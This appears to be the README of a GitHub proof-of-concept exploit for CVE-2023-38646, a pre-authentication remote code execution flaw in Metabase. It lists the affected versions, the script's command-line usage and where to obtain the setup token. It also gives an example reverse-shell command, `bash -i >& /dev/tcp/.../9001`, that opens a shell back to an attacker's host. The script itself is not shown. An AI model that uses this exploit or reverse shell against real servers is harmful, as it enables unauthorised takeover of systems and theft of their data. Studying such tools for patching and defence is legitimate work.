# Metabase Pre-Auth RCE (CVE-2023-38646) POC
This is a python script which exploits the remote code execution vulnerability of Metabase's login software. It allows us to execute arbitrary commands on the server before authentication.

Vulnerable versions are Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

## Usage
```
python3 exploit.py -u URL -t TOKEN -c COMMAND
```
## Arguments
```
-h, --help            show this help message and exit
-u URL, --url URL     Target URL
-t TOKEN, --token TOKEN
                      Setup-Token found in /api/session/properties
-c COMMAND, --command COMMAND
                      Command to be executed in the target host
```

## Example
![image](https://github.com/Pyr0sec/CVE-2023-38646/assets/74669749/705d63b5-4a52-42ae-bce7-4fb814883a79)

Command used: `bash -i >& /dev/tcp/10.10.14.26/9001 0>&1`

## References
[Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)
